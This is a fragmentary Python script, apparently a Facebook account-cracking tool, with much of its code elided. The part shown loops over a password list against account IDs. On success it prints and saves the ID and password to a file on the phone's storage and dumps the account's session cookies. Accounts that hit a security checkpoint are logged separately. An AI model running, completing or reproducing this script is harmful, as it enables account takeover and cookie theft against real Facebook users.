#WRITTEN BY ARIYAN SABBIR
#FOLLOW : https://github.com/HHH292
#------------- import -------------#
import os
...
def MR_DIPTO():
    clear()
    os.system('xdg-open https://github.com/HHH292')
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[SAKIB-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/SAKIB-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[SAKIB-CP] '+ids+' | '+pas+'\033[1;37m')
